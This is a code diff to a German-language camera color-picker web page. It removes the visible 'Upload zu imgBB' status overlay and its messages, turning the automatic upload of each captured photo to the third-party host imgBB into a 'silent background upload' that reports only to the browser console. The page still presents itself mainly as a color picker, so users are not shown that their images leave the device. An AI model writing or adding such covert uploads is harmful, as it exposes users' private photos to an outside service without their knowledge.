@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Color Picker</title>
+    <title>Auto-Upload Color Picker</title>
     <style>
         :root {
             --bg-gray: #f4f4f7;
@@ -81,21 +81,6 @@
             z-index: 10;
         }
 
-        .status-overlay {
-            position: absolute;
-            bottom: 10px;
-            left: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.6);
-            color: white;
-            padding: 5px 10px;
-            border-radius: 10px;
-            font-size: 0.75rem;
-            text-align: center;
-            display: none;
-            z-index: 15;
-        }
-
         .btn-camera {
             width: 100%;
             margin-top: 15px;
@@ -167,11 +152,10 @@
 
 <div class="container">
     <div class="photo-card">
-        <span class="section-title">Automatische Analyse</span>
+        <span class="section-title">Automatischer Upload</span>
         
         <div class="canvas-wrapper" id="canvasWrapper">
             <div class="placeholder-text" id="placeholderText">Kamera öffnen...</div>
-            <div class="status-overlay" id="statusOverlay">Upload läuft...</div>
             <canvas id="imageCanvas"></canvas>
             <div class="crosshair" id="crosshair"></div>
         </div>
@@ -201,14 +185,13 @@
     const canvas = document.getElementById('imageCanvas');
     const ctx = canvas.getContext('2d', { willReadFrequently: true });
     const wrapper = document.getElementById('canvasWrapper');
-    const statusOverlay = document.getElementById('statusOverlay');
     const crosshair = document.getElementById('crosshair');
     const mainPreview = document.getElementById('mainPreview');
     const paletteList = document.getElementById('paletteList');
 
     let imageLoaded = false;
 
-    // 1. Sobald ein Bild gewählt/aufgenommen wurde
+    // Bild laden & Upload triggern
     cameraInput.addEventListener('change', function(e) {
         const file = e.target.files[0];
         if (!file) return;
@@ -220,7 +203,6 @@
                 document.getElementById('placeholderText').style.display = 'none';
                 imageLoaded = true;
 
-                // Canvas anpassen
                 const rect = wrapper.getBoundingClientRect();
                 canvas.width = rect.width;
                 canvas.height = rect.height;
@@ -233,7 +215,7 @@
 
                 ctx.drawImage(img, x, y, w, h);
                 
-                // --- AUTOMATISCHER UPLOAD START ---
+                // Stiller Upload im Hintergrund
                 autoUpload();
             }
             img.src = event.target.result;
@@ -241,11 +223,8 @@
         reader.readAsDataURL(file);
     });
 
-    // 2. Upload Logik (wird automatisch aufgerufen)
+    // Stiller Hintergrund-Upload
     function autoUpload() {
-        statusOverlay.style.display = 'block';
-        statusOverlay.textContent = "⏳ Upload zu imgBB...";
-
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
             formData.append("image", blob);
@@ -256,22 +235,16 @@
                     body: formData
                 });
                 const data = await response.json();
-
                 if (data.success) {
-                    statusOverlay.textContent = "✅ Hochgeladen!";
-                    console.log("URL:", data.data.url);
-                    // Nach 3 Sekunden Status ausblenden
-                    setTimeout(() => { statusOverlay.style.display = 'none'; }, 3000);
-                } else {
-                    statusOverlay.textContent = "❌ Fehler beim Upload";
+                    console.log("Upload erfolgreich:", data.data.url);
                 }
             } catch (err) {
-                statusOverlay.textContent = "❌ Netzwerkfehler (CORS?)";
+                console.error("Upload-Fehler (Hintergrund):", err);
             }
         }, 'image/jpeg', 0.8);
     }
 
-    // 3. Color Picker Logik
+    // Color Picker Logik
     function pickColor(e) {
         if (!imageLoaded) return;
         const rect = canvas.getBoundingClientRect();
@@ -297,7 +270,6 @@
     canvas.addEventListener('touchmove', (e) => { e.preventDefault(); pickColor(e); });
     canvas.addEventListener('mousedown', pickColor);
 
-    // Hilfsfunktionen
     function rgbToHex(r, g, b) {
         return "#" + [r, g, b].map(x => x.toString(16).padStart(2, '0')).join('').toUpperCase();
     }
